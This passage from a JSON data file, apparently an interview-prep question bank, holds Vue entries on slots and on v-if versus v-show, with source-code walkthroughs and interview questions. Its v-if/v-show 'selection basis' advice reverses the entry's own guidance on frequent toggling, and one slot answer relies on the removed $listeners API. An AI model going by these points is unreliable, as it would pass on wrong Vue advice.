        "createAt": "2023-12-17T11:01:18.000Z",
        "updateAt": "2024-08-10T17:07:38.000Z"
      }
    ]
  },
  "72": {
    "id": 72,
    "tagId": 14,
    "title": "插槽",
    "explanation": "## 一、插槽的几种使用方式\n\n### 1. 普通插槽\n\n举例来说，这里有一个 `<FancyButton>` 组件，可以像这样使用：\n\n```html\n<FancyButton>\n  Click me! <!-- 插槽内容 -->\n</FancyButton>\n```\n\n而 `<FancyButton>` 的模板是这样的：\n\n```html\n<button class=\"fancy-btn\">\n  <slot></slot> <!-- 插槽出口 -->\n</button>\n```\n\n`<slot>` 元素是一个 **插槽出口** (slot outlet)，标示了父元素提供的 **插槽内容** (slot content) 将在哪里被渲染。\n\n最终渲染出的 DOM 是这样：\n\n```html\n<button class=\"fancy-btn\">Click me!</button>\n```\n\n### 2. 具名插槽\n\n有时在一个组件中包含多个插槽出口是很有用的。举例来说，在一个 `<BaseLayout>` 组件中，有如下模板：\n\n```html\n<div class=\"container\">\n  <header>\n    <!-- 标题内容放这里 -->\n  </header>\n  <main>\n    <!-- 主要内容放这里 -->\n  </main>\n  <footer>\n    <!-- 底部内容放这里 -->\n  </footer>\n</div>\n```\n\n对于这种场景， `<slot>` 元素可以有一个特殊的 attribute `name`，用来给各个插槽分配唯一的 ID，以确定每一处要渲染的内容：\n\n```html\n<div class=\"container\">\n  <header>\n    <slot name=\"header\"></slot>\n  </header>\n  <main>\n    <slot></slot>\n  </main>\n  <footer>\n    <slot name=\"footer\"></slot>\n  </footer>\n</div>\n```\n\n这类带 `name` 的插槽被称为具名插槽 (named slots)。没有提供 `name` 的 `<slot>` 出口会隐式地命名为“default”。\n\n在父组件中使用 `<BaseLayout>` 时，我们需要一种方式将多个插槽内容传入到各自目标插槽的出口。此时就需要用到 **具名插槽** 了：\n\n要为具名插槽传入内容，我们需要使用一个含 `v-slot` 指令的 `<template>` 元素，并将目标插槽的名字传给该指令\n\n```html\n<BaseLayout>\n  <template v-slot:header>\n    <!-- header 插槽的内容放这里 -->\n  </template>\n</BaseLayout>\n```\n\n`v-slot` 有对应的简写 `#`，因此 `<template v-slot:header>` 可以简写为 `<template #header>`。其意思就是“将这部分模板片段传入子组件的 header 插槽中”。\n\n完整代码：\n\n```html\n<BaseLayout>\n  <template #header>\n    <h1>Here might be a page title</h1>\n  </template>\n\n  <template #default>\n    <p>A paragraph for the main content.</p>\n    <p>And another one.</p>\n  </template>\n\n  <template #footer>\n    <p>Here's some contact info</p>\n  </template>\n</BaseLayout>\n```\n\n具体效果：\n\n```html\n<div class=\"container\">\n  <header>\n    <h1>Here might be a page title</h1>\n  </header>\n  <main>\n    <p>A paragraph for the main content.</p>\n    <p>And another one.</p>\n  </main>\n  <footer>\n    <p>Here's some contact info</p>\n  </footer>\n</div>\n```\n\n### 3. 作用域插槽\n\n#### （1） 渲染作用域\n\n在介绍作用域插槽之前，我们必须先了解插槽的渲染作用域。\n\n插槽内容可以访问到父组件的数据作用域，因为插槽内容本身是在父组件模板中定义的。举例来说：\n\n```html\n<span>{{ message }}</span>\n<FancyButton>{{ message }}</FancyButton>\n```\n\n这里的两个 `{{ message }}` 插值表达式渲染的内容都是一样的。\n\n但是，插槽内容 **无法访问** 子组件的数据。\n\nVue 模板中的表达式只能访问其定义时所处的作用域，这和 JavaScript 的词法作用域规则是一致的。\n\n换言之：\n\n> 父组件模板中的表达式只能访问父组件的作用域；子组件模板中的表达式只能访问子组件的作用域。\n\n#### （2） 使用案例\n\n前面提到过父组件中是无法访问到子组件作用域的，那在某些特殊场景，父组件需要用到子组件数据的时候该怎么办呢？也就是需要子组件在渲染的时候将数据提供给插槽。\n\n我们也确实有办法这么做！可以像对组件传递 `props` 那样，向一个插槽的出口上传递 `attributes`：\n\n```html\n<!-- <MyComponent> 的模板 -->\n<div>\n  <slot :text=\"greetingMessage\" :count=\"1\"></slot>\n</div>\n```\n\n当需要接收插槽 `props` 时，默认插槽和具名插槽的使用方式有一些小区别。下面我们将先展示默认插槽如何接受 props，通过子组件标签上的 `v-slot` 指令，直接接收到了一个插槽 props 对象：\n\n```html\n<MyComponent v-slot=\"slotProps\">\n  {{ slotProps.text }} {{ slotProps.count }}\n</MyComponent>\n```\n\n你可以将作用域插槽类比为一个传入子组件的函数。子组件会将相应的 `props` 作为参数传给它：\n\n```javascript\nMyComponent({\n  // 类比默认插槽，将其想成一个函数\n  default: (slotProps) => {\n    return `${slotProps.text} ${slotProps.count}`\n  }\n})\n\nfunction MyComponent(slots) {\n  const greetingMessage = 'hello'\n  return `<div>${\n    // 在插槽函数调用时传入 props\n    slots.default({ text: greetingMessage, count: 1 })\n  }</div>`\n}\n```\n\n## 二、插槽的实现原理\n\n插槽的实现其实可以分成两部分，一个是 **在父组件中准备好子组件插槽部分的模板内部**。一个在是 **在子组件渲染的时候，把这个模板内容填充到子组件对应的插槽中**。\n\n但是问题来了，在父组件渲染时，是不能渲染子组件插槽部分的内容。所以我们需要先保存下来，等到子组件渲染的时候再取出来使用。\n\n### 1. 父组件渲染时的处理\n\n为了更方便的理解，我们先准备一个父组件模板：\n\n```html\n<layout>\n  <template v-slot:header>\n    <h1>{{ header }}</h1>\n  </template>\n  <template v-slot:default>\n    <p>{{ main }}</p>\n  </template>\n  <template v-slot:footer>\n    <p>{{ footer }}</p>\n  </template>\n</layout>\n```\n\n我们还是跟之前一样借助官方提供的 模板导出工具平台 查看它编译后的render函数：\n\n```javascript\nimport { toDisplayString as _toDisplayString, createElementVNode as _createElementVNode, resolveComponent as _resolveComponent, withCtx as _withCtx, openBlock as _openBlock, createBlock as _createBlock } from \"vue\"\n\nexport function render(_ctx, _cache, $props, $setup, $data, $options) {\n  const _component_layout = _resolveComponent(\"layout\")\n\n  return (_openBlock(), _createBlock(_component_layout, null, {\n    header: _withCtx(() => [\n      _createElementVNode(\"h1\", null, _toDisplayString(_ctx.header), 1 /* TEXT */)\n    ]),\n    default: _withCtx(() => [\n      _createElementVNode(\"p\", null, _toDisplayString(_ctx.main), 1 /* TEXT */)\n    ]),\n    footer: _withCtx(() => [\n      _createElementV\nNode(\"p\", null, _toDisplayString(_ctx.footer), 1 /* TEXT */)\n    ]),\n    _: 1 /* STABLE */\n  }))\n}\n```\n\n#### （1） createBlock\n\n我们重点关注 `createBlock` 这个函数，第三个参数接收了一个对象。 `createBlock` 内部实际会调用 `createVNode` 函数，我们看它的实现：\n\n```javascript\nfunction createVNode(type,props = null,children = null) {\n  if (props) {\n    // 处理 props 相关逻辑，标准化 class 和 style\n  }\n  // 对 vnode 类型信息编码\n    // 创建 vnode 对象\n    const vnode = {\n    \ttype,\n    \tprops\n    \t// 其他一些属性\n    }\n    // 标准化子节点，把不同数据类型的 children 转成数组或者文本类型\n    normalizeChildren(vnode, children) return vnode\n    }\n\n```\n\n其中， `normalizeChildren ` 就是用来处理传入的参数 `children`，我们来看一下它的实现：\n\n```javascript\nfunction normalizeChildren (vnode, children) {\n  let type = 0\n  const { shapeFlag } = vnode\n  if (children == null) {\n    children = null\n  }\n  else if (isArray(children)) {\n    type = 16 /* ARRAY_CHILDREN */\n  }\n  else if (typeof children === 'object') {\n    // 标准化 slot 子节点\n    if ((shapeFlag & 1 /* ELEMENT */ || shapeFlag & 64 /* TELEPORT */) && children.default) {\n      // 处理 Teleport 的情况\n      normalizeChildren(vnode, children.default())\n      return\n    }\n    else {\n      // 确定 vnode 子节点类型为 slot 子节点\n      type = 32 /* SLOTS_CHILDREN */\n      const slotFlag = children._\n      if (!slotFlag && !(InternalObjectKey in children)) {\n        children._ctx = currentRenderingInstance\n      }\n      else if (slotFlag === 3 /* FORWARDED */ && currentRenderingInstance) {\n        // 处理类型为 FORWARDED 的情况\n        if (currentRenderingInstance.vnode.patchFlag & 1024 /* DYNAMIC_SLOTS */) {\n          children._ = 2 /* DYNAMIC */\n          vnode.patchFlag |= 1024 /* DYNAMIC_SLOTS */\n        }\n        else {\n          children._ = 1 /* STABLE */\n        }\n      }\n    }\n  }\n  else if (isFunction(children)) {\n    children = { default: children, _ctx: currentRenderingInstance }\n    type = 32 /* SLOTS_CHILDREN */\n  }\n  else {\n    children = String(children)\n    if (shapeFlag & 64 /* TELEPORT */) {\n      type = 16 /* ARRAY_CHILDREN */\n      children = [createTextVNode(children)]\n    }\n    else {\n      type = 8 /* TEXT_CHILDREN */\n    }\n  }\n  vnode.children = children\n  vnode.shapeFlag |= type\n}\n```\n\n1. 往 `vnode.children` 属性上赋值传入的对象数据\n\n2. `vnode.shapeFlag` 会与 `slot` 子节点类型 `SLOTS_CHILDREN` 进行或运算，由于 `vnode` 本身的 `shapFlag ` 是 `STATEFUL_COMPONENT`，所以运算后的 ` shapeFlag` 是 ` SLOTS_CHILDREN | STATEFUL_COMPONENT`。\n\n3. 不同的 ` shapeFlag` 会影响后续的 ` patch` 过程，我们知道在 ` patch` 中会根据 vnode 的 `type ` 和 `shapeFlag` 来决定后续的执行逻辑，我们来回顾一下它的实现：\n\n#### （2）patch 函数\n\n```javascript\nconst patch = (n1, n2, container, anchor = null, parentComponent = null, parentSuspense = null, isSVG = false, optimized = false) => {\n  // 如果存在新旧节点, 且新旧节点类型不同，则销毁旧节点\n  if (n1 && !isSameVNodeType(n1, n2)) {\n    anchor = getNextHostNode(n1)\n    unmount(n1, parentComponent, parentSuspense, true)\n    n1 = null\n  }\n  const { type, shapeFlag } = n2\n  switch (type) {\n    case Text:\n      // 处理文本节点\n      break\n    case Comment:\n      // 处理注释节点\n      break\n    case Static:\n      // 处理静态节点\n      break\n    case Fragment:\n      // 处理 Fragment 元素\n      break\n    default:\n      if (shapeFlag & 1 /* ELEMENT */) {\n        // 处理普通 DOM 元素\n      }\n      else if (shapeFlag & 6 /* COMPONENT */) {\n        // 处理组件\n        processComponent(n1, n2, container, anchor, parentComponent, parentSuspense, isSVG, optimized)\n      }\n      else if (shapeFlag & 64 /* TELEPORT */) {\n        // 处理 TELEPORT\n      }\n      else if (shapeFlag & 128 /* SUSPENSE */) {\n        // 处理 SUSPENSE\n      }\n  }\n}\n```\n\n这里由于 ` type` 是组件对象， `shapeFlag` 满足 `shapeFlag&6` 的情况，所以会走到 `processComponent` 的逻辑，递归去渲染子组件。\n\n至此，带有子节点插槽的组件与普通的组件渲染并无区别，还是 **通过递归的方式去渲染子组件**。\n\n渲染子组件又会执行组件的渲染逻辑了，这个流程我们在前面的章节已经分析过，其中有一个 `setupComponent` 的流程，我们来回顾一下它的实现：\n\n#### （3）setupComponent 函数\n\n```javascript\nfunction setupComponent (instance, isSSR = false) {\n  const { props, children, shapeFlag } = instance.vnode\n  // 判断是否是一个有状态的组件\n  const isStateful = shapeFlag & 4\n  // 初始化 props\n  initProps(instance, props, isStateful, isSSR)\n  // 初始化插槽\n  initSlots(instance, children)\n  // 设置有状态的组件实例\n  const setupResult = isStateful\n    ? setupStatefulComponent(instance, isSSR)\n    : undefined\n  return setupResult\n}\n```\n\n这里从 `vnode` 里面取出了 `props` 和 `children` 等等数据，然后在执行 `initSlots` 初始化 插槽的时候传入 `instance` 和 `children` 数据\n\n#### （4）initSlots 函数\n\n```javascript\nconst initSlots = (instance, children) => {\n  if (instance.vnode.shapeFlag & 32 /* SLOTS_CHILDREN */) {\n    const type = children._\n    if (type) {\n      instance.slots = children\n      def(children, '_', type)\n    }\n    else {\n      normalizeObjectSlots(children, (instance.slots = {}))\n    }\n  }\n  else {\n    instance.slots = {}\n    if (children) {\n      normalizeVNodeSlots(instance, children)\n    }\n  }\n  def(instance.slots, InternalObjectKey, 1)\n}\n```\n\n`initSlots` 的实现逻辑很简单，这里的 `children` 就是前面传入的插槽对象数据，然后我们把它保留到 `instance.slots` 对象中，后续我们就可以从 ` instance.slots` 拿到插槽的数据了。\n\n### 2. 子组件渲染时的处理\n\n子组件在初始化过程中拿到父组件传入的插槽数据，现在就差最后一步，子组件将插槽数据渲染到页面上。\n\n我们先来看子组件的模板\n\n```html\n<div class=\"layout\">\n  <header>\n    <slot name=\"header\"></slot>\n  </header>\n  <main>\n    <slot></slot>\n  </main>\n  <footer>\n    <slot name=\"footer\"></slot>\n  </footer>\n</div>\n```\n\n```javascript\nimport { renderSlot as _renderSlot, createVNode as _createVNode, openBlock as _openBlock, createBlock as _createBlock } from \"vue\"\nexport function render(_ctx, _cache, $props, $setup, $data, $options) {\n  return (_openBlock(), _createBlock(\"div\", { class: \"layout\" }, [\n    _createVNode(\"header\", null, [\n      _renderSlot(_ctx.$slots, \"header\")\n    ]),\n    _createVNode(\"main\", null, [\n      _renderSlot(_ctx.$slots, \"default\")\n    ]),\n    _createVNode(\"footer\", null, [\n      _renderSlot(_ctx.$slots, \"footer\")\n    ])\n  ]))\n}\n```\n\n#### （1） renderSlot 函数\n\n通过编译后的代码我们可以看出，子组件的插槽部分的 `DOM ` 主要通过 `renderSlot` 方法渲染生成的，我们来看它的实现：\n\n```javascript\nfunction renderSlot(slots, name, props = {}, fallback) {\n  let slot = slots[name];\n  return (openBlock(),\n    createBlock(Fragment, { key: props.key }, slot ? slot(props) : fallback ? fallback() : [], slots._ === 1 /* STABLE */\n      ? 64 /* STABLE_FRAGMENT */\n      : -2 /* BAIL */));\n}\n```\n\n`renderSlot` 的实现非常简单，就是根据传入的 `name`，去 `slots` 中找到对应的 `slot` 插槽数据。 `slots` 也就是下面这个数据\n\n\n```javascript\n{\nheader: _withCtx(() => [\n_createVNode(\"h1\", null, _toDisplayString(_ctx.header), 1 /* TEXT */)\n]),\ndefault: _withCtx(() => [\n_createVNode(\"p\", null, _toDisplayString(_ctx.main), 1 /* TEXT */)\n]),\nfooter: _withCtx(() => [\n_createVNode(\"p\", null, _toDisplayString(_ctx.footer), 1 /* TEXT */)\n]),\n_: 1\n}\n```\n\n那么对于 `name` 为 `header`，它的值就是：\n\n```javascript\n_withCtx(() => [\n  _createVNode(\"h1\", null, _toDisplayString(_ctx.header), 1 /* TEXT */)\n])\n```\n\n找到对应的slot插槽数据之后，会通过 `createBlock` 创建了 ` vnode` 节点\n\n> 注意，它的类型是一个 Fragment，children 是执行 slot 插槽函数的返回值。\n\n#### （2）withCtx\n\n`slot` 函数其实是执行 ` _withCtx` 函数后的返回值，我们接着看 ` withCtx` 函数的实现：\n\n```javascript\nfunction withCtx(fn, ctx = currentRenderingInstance) {\n  if (!ctx)\n    return fn\n  return function renderFnWithContext() {\n    const owner = currentRenderingInstance\n    setCurrentRenderingInstance(ctx)\n    const res = fn.apply(null, arguments)\n    setCurrentRenderingInstance(owner)\n    return res\n  }\n}\n```\n\n1. `withCtx` 的实现很简单，它支持传入一个函数 `fn` 和执行的上下文变量 ` ctx`，它的默认值是 `currentRenderingInstance`，也就是执行 `render` 函数时的当前组件实例。\n\n2. `withCtx` 会返回一个新的函数，这个函数执行的时候，会先保存当前渲染的组件实例 `owner`，然后把 `ctx ` 设置为当前渲染的组件实例，接着执行 ` f` n，执行完毕后，再把之前的 ` owner` 设置为当前组件实例。\n\n3. 这么做就是为了保证在子组件中渲染具体插槽内容时，它的渲染组件实例是父组件实例，这样也就保证它的数据作用域也是父组件的了。\n\n所以对于 ` header` 这个 ` slot`，它的 `slot` 函数的返回值是一个数组，如下：\n\n```javascript\n[\n  _createVNode(\"h1\", null, _toDisplayString(_ctx.header), 1 /* TEXT */)\n]\n```\n\n我们回到 `renderSlot` 函数，最终插槽对应的 ` vnode` 渲染就变成了如下函数\n\n```javascript\ncreateBlock(Fragment, { key: props.key }, [_createVNode(\"h1\", null, _toDisplayString(_ctx.header), 1 /* TEXT */)], 64 /* STABLE_FRAGMENT */)\n```\n\n我们知道， `createBlock ` 内部是会执行 ` createVNode` 创建 ` vnode`， `vnode` 创建完后，仍然会通过 `patch` 把 ` vnode` 挂载到页面上，那么对于插槽的渲染， `patch ` 过程又有什么不同呢？\n\n#### （3）processFragment\n\n注意这里我们的 ` vnode` 的 ` type` 是 `Fragement`，所以在执行 `patch` 的时候，会执行 `processFragment ` 逻辑，我们来看它的实现：\n\n```javascript\nconst processFragment = (n1, n2, container, anchor, parentComponent, parentSuspense, isSVG, optimized) => {\n  const fragmentStartAnchor = (n2.el = n1 ? n1.el : hostCreateText(''))\n  const fragmentEndAnchor = (n2.anchor = n1 ? n1.anchor : hostCreateText(''))\n  let { patchFlag } = n2\n  if (patchFlag > 0) {\n    optimized = true\n  }\n  if (n1 == null) {\n   //插入节点\n    hostInsert(fragmentStartAnchor, container, anchor)\n    hostInsert(fragmentEndAnchor, container, anchor)\n    // 再挂载子节点\n    mountChildren(n2.children, container, fragmentEndAnchor, parentComponent, parentSuspense, isSVG, optimized)\n  } else {\n    // 更新节点\n  }\n}\n```\n\n我们只分析挂载子节点的过程，所以 n1 的值为 `null`，n2 就是我们前面创建的 `vnode ` 节点，它的 `children` 是一个数组。\n\n`processFragment` 函数首先通过 `hostInsert` 在容器的前后插入两个空文本节点，然后在以尾文本节点作为参考锚点，通过 ` mountChildren` 把 `children` 挂载到 `container ` 容器中。\n\n至此，我们就完成了子组件插槽内容的渲染。\n\n\n",
    "testPoint": "### **1. 插槽的基本概念和用法**\n#### **问题：**\n1. 什么是插槽？插槽的基本使用方式是怎样的？  \n2. 插槽和 `props` 的区别是什么？什么时候选择插槽而不是 `props`？  \n3. 如果父组件传递的内容为空，插槽会渲染什么？\n\n#### **考察点：**\n- 插槽的基础使用：\n  - 子组件使用 `<slot>` 定义插槽：\n    ```vue\n    <!-- 子组件 -->\n    <div>\n      <slot></slot>\n    </div>\n    ```\n  - 父组件传递内容：\n    ```vue\n    <!-- 父组件 -->\n    <MyComponent>\n      <p>插槽中的内容</p>\n    </MyComponent>\n    ```\n- 插槽的默认内容：\n  - 当父组件没有传递内容时，渲染插槽的默认内容：\n    ```vue\n    <slot>默认内容</slot>\n    ```\n\n---\n\n### **2. 具名插槽**\n#### **问题：**\n1. 具名插槽如何使用？如何在一个组件中定义多个插槽？  \n2. 如果未传递具名插槽内容，会渲染什么？  \n3. 如何为默认插槽和具名插槽同时传递内容？\n\n#### **考察点：**\n- 定义具名插槽：\n  ```vue\n  <!-- 子组件 -->\n  <div>\n    <slot name=\"header\">默认头部内容</slot>\n    <slot>默认主体内容</slot>\n    <slot name=\"footer\">默认底部内容</slot>\n  </div>\n  ```\n- 传递具名插槽内容：\n  ```vue\n  <!-- 父组件 -->\n  <MyComponent>\n    <template #header>\n      <h1>自定义头部</h1>\n    </template>\n    <template #footer>\n      <p>自定义底部</p>\n    </template>\n  </MyComponent>\n  ```\n\n---\n\n### **3. 作用域插槽**\n#### **问题：**\n1. 什么是作用域插槽？作用域插槽的主要使用场景是什么？  \n2. 如何在父组件中访问子组件传递的数据？  \n3. `v-slot` 的语法糖是什么？\n\n#### **考察点：**\n- **作用域插槽定义和使用**：\n  - 子组件通过 `<slot>` 将数据暴露给父组件：\n    ```vue\n    <!-- 子组件 -->\n    <slot :data=\"someData\"></slot>\n    ```\n  - 父组件通过作用域插槽接收数据：\n    ```vue\n    <!-- 父组件 -->\n    <MyComponent>\n      <template #default=\"slotProps\">\n        <p>{{ slotProps.data }}</p>\n      </template>\n    </MyComponent>\n    ```\n- **简化语法（v-slot）**：\n  ```vue\n  <MyComponent v-slot:default=\"slotProps\">\n    <p>{{ slotProps.data }}</p>\n  </MyComponent>\n  ```\n\n#### **深入考察：**\n- **用途**：\n  - 动态渲染列表内容。\n  - 通过插槽传递逻辑控制权。\n- **性能问题**：\n  - 子组件频繁重新渲染时，是否影响插槽内容的更新。\n\n---\n\n### **4. 动态插槽**\n#### **问题：**\n1. 如何动态指定插槽名？动态插槽的使用场景有哪些？  \n2. 如果动态插槽未匹配到插槽名，插槽内容会如何处理？\n\n#### **考察点：**\n- 动态插槽的定义：\n  ```vue\n  <!-- 父组件 -->\n  <MyComponent>\n    <template v-slot:[dynamicSlotName]>\n      <p>动态插槽内容</p>\n    </template>\n  </MyComponent>\n  ```\n- 使用场景：\n  - 动态生成不同的内容区域。\n  - 在开发组件库时为插槽提供更多灵活性。\n\n---\n\n### **5. 插槽的使用限制与注意事项**\n#### **问题：**\n1. 如果子组件的插槽定义在 `v-if` 的分支中，插槽内容会如何表现？  \n2. 插槽内容是父组件的一部分，为什么会影响父组件的作用域？  \n3. 是否可以为插槽内容绑定动态事件？如果可以，如何实现？\n\n#### **考察点：**\n- 插槽内容始终属于父组件的作用域：\n  ```vue\n  <slot></slot>\n  <!-- 插槽内容的表达式，例如 {{ value }}，引用的是父组件的数据 -->\n  ```\n- 插槽与子组件的生命周期：\n  - 插槽内容在父组件和子组件生命周期的交互中可能造成意外的行为。\n- 动态事件绑定：\n  - 使用 `$listeners` 或 `$attrs` 将事件转发到插槽内容。\n\n---\n\n### **6. Vue 3 插槽的新特性**\n#### **问题：**\n1. Vue 3 中插槽的主要改进是什么？  \n2. Vue 3 如何优化插槽的性能问题？\n\n#### **考察点：**\n- **默认插槽的优化**：\n  - Vue 3 中插槽内容按需渲染，而不是提前编译所有内容。\n- **动态插槽改进**：\n  - 提供更高的灵活性，支持动态键值的插槽名。\n- **插槽传递（Slot forwarding）**：\n  - 子组件可以将插槽内容传递给其嵌套的子组件。\n\n---\n\n### **7. 开放性问题**\n#### **问题：**\n1. 项目中你是如何使用插槽来提高组件的复用性和灵活性的？  \n2. 插槽与其他通信方式（如 props）相比，有哪些优劣势？\n\n#### **考察点：**\n- 候选人对插槽使用场景的理解。\n- 是否能灵活运用插槽解决实际开发问题，如构建表格、布局、或动态内容。\n\n---\n\n### **总结**\n插槽是 Vue 的重要功能，能够极大提高组件复用性和灵活性。考察插槽时，可以通过 **基本用法**、**具名插槽**、**作用域插槽**、**动态插槽** 及 **性能优化** 等多个层次测试候选人的理解和实际运用能力。同时开放性问题能够帮助评估候选人解决复杂场景问题的能力。",
    "exerciseKeyList": "[\"a4905b6d-283a-48ee-8c19-6f390f7fd9bc\",\"28305428-953c-4daa-9b4e-f3d01b694017\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-04T14:22:13.000Z",
    "updateAt": "2024-12-15T11:47:13.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "28305428-953c-4daa-9b4e-f3d01b694017",
        "title": "说说你对slot的理解？slot使用场景有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:39:36.000Z",
        "updateAt": "2024-08-10T17:04:42.000Z"
      },
      {
        "exerciseKey": "a4905b6d-283a-48ee-8c19-6f390f7fd9bc",
        "title": "编写一个vue组件，组件内部使用插槽接收外部内容，v-model双向绑定，实现折叠展开的功能",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:31:13.000Z",
        "updateAt": "2023-12-17T18:31:20.000Z"
      }
    ]
  },
  "73": {
    "id": 73,
    "tagId": 14,
    "title": "v-if/v-show",
    "explanation": "\nv-show原理\n========\n\n```javascript\nexport const vShow: ObjectDirective<VShowElement> = {\n  beforeMount(el, { value }, { transition }) {\n    el._vod = el.style.display === 'none' ? '' : el.style.display\n    if (transition && value) {\n      transition.beforeEnter(el)\n    } else {\n      setDisplay(el, value)\n    }\n  },\n  mounted(el, { value }, { transition }) {\n    if (transition && value) {\n      transition.enter(el)\n    }\n  },\n  updated(el, { value, oldValue }, { transition }) {\n    // ...\n  },\n  beforeUnmount(el, { value }) {\n    setDisplay(el, value)\n  }\n}\n\n```\n\n有`transition`就执行`transition`，没有`transition`就直接设置`display`。不管初始条件是什么，元素总是会被渲染。\n\nv-if原理\n======\n\n```javascript\nexport const transformIf = createStructuralDirectiveTransform(\n  /^(if|else|else-if)$/,\n  (node, dir, context) => {\n    return processIf(node, dir, context, (ifNode, branch, isRoot) => {\n      // ...\n      return () => {\n        if (isRoot) {\n          ifNode.codegenNode = createCodegenNodeForBranch(\n            branch,\n            key,\n            context\n          ) as IfConditionalExpression\n        } else {\n          // attach this branch's codegen node to the v-if root.\n          const parentCondition = getParentCondition(ifNode.codegenNode!)\n          parentCondition.alternate = createCodegenNodeForBranch(\n            branch,\n            key + ifNode.branches.length - 1,\n            context\n          )\n        }\n      }\n    })\n  }\n)\n\n```\n\n返回一个`node`节点，`render`函数通过表达式的值来决定是否生成`DOM`\n\n相同点\n===\n\n都能控住元素在页面上是否显示\n\n```\n<div v-show=\"isShow\"></div>\n<div v-if=\"isShow\"></div>\n\n```\n\n不同点\n===\n\n*   控制手段不同：`v-show`是控制css的`display`是否为none来隐藏或展示，dom元素一直都是在的。而`v-if`显示隐藏是直接将整个dom元素添加或删除。\n*   编译过程不同：`v-show`只是简单地基于css切换。而`v-if`的切换有一个局部编译/卸载的过程，切换过程中会销毁和重建内部的事件监听和子组件。\n*   编译条件不同：`v-if`是真正的条件渲染，它会确保在切换过程中条件块内的事件监听器和子组件被销毁和重建，只有渲染条件为真时才渲染。\n*   `v-show`由false变为true的时候不会触发组件的生命周期。\n*   `v-if`由false变为true的时候，触发组件的`beforeCreate`、`create`、`beforeMount`、`mounted`钩子，由true变为false时触发组件的`beforeDestory`、`destoryed`方法。\n*   `v-if`有更高的切换消耗，`v-show`有更高的初始渲染消耗。\n\n使用场景\n====\n\n1.  如果需要频繁地切换，则`v-show`较好。\n2.  如果在运行时条件很少改变，则使用`v-if`较好。\n\n ",
    "testPoint": "### **1. `v-if` 和 `v-show` 的基本用法**\n#### **问题：**\n1. `v-if` 和 `v-show` 有什么区别？它们是如何控制元素的显示和隐藏的？  \n2. 你通常会选择使用 `v-if` 还是 `v-show`，具体应用场景是什么？\n\n#### **考察点：**\n- **`v-if` 的基本用法**：\n  - `v-if` 用来控制元素的渲染，只有条件为 `true` 时才会创建或销毁元素：\n    ```vue\n    <div v-if=\"isVisible\">Hello, world!</div>\n    ```\n  - `v-if` 会在条件变化时触发 DOM 的销毁和重新渲染。\n\n- **`v-show` 的基本用法**：\n  - `v-show` 用来控制元素的显示与隐藏，通过设置元素的 `display` 样式：\n    ```vue\n    <div v-show=\"isVisible\">Hello, world!</div>\n    ```\n  - `v-show` 会保留元素在 DOM 中，仅通过修改 `display` 样式来控制元素的可见性。\n\n---\n\n### **2. `v-if` 和 `v-show` 的性能差异**\n#### **问题：**\n1. `v-if` 和 `v-show` 在性能上有什么区别？  \n2. 在性能要求较高的场景下，你会选择使用 `v-if` 还是 `v-show`？\n\n#### **考察点：**\n- **`v-if` 的性能开销**：\n  - `v-if` 会在条件变化时销毁并重新创建 DOM 元素。如果条件变化频繁，频繁的 DOM 操作可能会带来性能问题。\n- **`v-show` 的性能开销**：\n  - `v-show` 只会切换元素的 `display` 样式，因此无需重新渲染元素，性能开销较小。但如果元素内容复杂，使用 `v-show` 时，元素仍然存在于 DOM 中，可能会造成不必要的内存占用。\n\n- **选择依据**：\n  - 如果条件变化不频繁，且元素较复杂（例如绑定了复杂事件或子组件），使用 `v-show` 更合适。\n  - 如果条件变化较频繁或元素简单（例如简单的文本或图标），使用 `v-if` 更合适，避免不必要的渲染。\n\n---\n\n### **3. 应用场景**\n#### **问题：**\n1. 在动态列表、分页组件或其他多次更新的场景中，应该如何选择使用 `v-if` 还是 `v-show`？\n2. `v-if` 和 `v-show` 在如何处理过渡动画上有区别吗？\n\n#### **考察点：**\n- **动态列表或分页场景**：\n  - 如果一个列表或分页项的显示与隐藏变化频繁，且列表项较简单，使用 `v-show` 会更高效。\n  - 如果列表项的渲染涉及较为复杂的逻辑（例如数据请求、组件创建等），使用 `v-if` 会更适合，避免不必要的渲染。\n\n- **过渡动画**：\n  - `v-if` 和 `v-show` 都支持 Vue 的过渡动画。不同的是，`v-if` 会在元素进入和离开时触发过渡，而 `v-show` 仅会在元素显示与隐藏时触发过渡。\n  - 对于复杂的过渡效果，如果需要元素完全消失并重新创建，`v-if` 更合适。对于简单的显隐效果，`v-show` 更加轻便。\n\n---\n\n### **4. 内部机制**\n#### **问题：**\n1. `v-if` 和 `v-show` 在 Vue 内部是如何实现的？它们的底层差异是什么？\n2. `v-if` 和 `v-show` 会如何影响事件监听和生命周期钩子？\n\n#### **考察点：**\n- **`v-if` 的实现**：\n  - `v-if` 会根据条件动态添加或移除元素及其子组件。当条件为 `true` 时，Vue 会创建该元素，并在条件为 `false` 时销毁它。这意味着它会完全消耗性能进行创建和销毁。\n- **`v-show` 的实现**：\n  - `v-show` 会通过 CSS 控制元素的 `display` 属性，元素一直存在于 DOM 中，只是通过修改样式来控制其显示与隐藏。\n\n- **生命周期钩子**：\n  - 使用 `v-if` 时，元素及其组件的生命周期钩子（如 `mounted` 和 `destroyed`）会在元素渲染和销毁时被触发。\n  - 使用 `v-show` 时，元素的生命周期钩子不会被触发，元素始终存在于 DOM 中，只是其样式被修改。\n\n---\n\n### **5. 组合与嵌套**\n#### **问题：**\n1. 在同一个组件中，能同时使用 `v-if` 和 `v-show` 吗？这种做法有什么潜在问题？\n2. 如果在一个父组件中同时使用 `v-if` 和 `v-show` 来控制不同的子组件，如何保证性能和可维护性？\n\n#### **考察点：**\n- **`v-if` 和 `v-show` 混合使用**：\n  - 在同一元素或同一组件上混合使用 `v-if` 和 `v-show` 是不建议的。由于它们控制元素显示的方式不同，可能会导致代码的复杂性和不易维护性。\n- **父子组件的 `v-if` 和 `v-show` 使用**：\n  - 在父组件中控制子组件的显示隐藏时，可以根据场景选择 `v-if` 或 `v-show`。对于频繁变化的子组件，推荐使用 `v-show`；而对于不频繁显示的复杂子组件，推荐使用 `v-if`。\n\n---\n\n### **总结**\n`v-if` 和 `v-show` 都用于控制元素的显示与隐藏，但它们的实现方式和性能差异决定了它们适用于不同的场景。在面试中，考察候选人对 **基本用法**、**性能差异**、**应用场景** 和 **内部机制** 的理解，能帮助评估其对 Vue 渲染机制的掌握程度。",
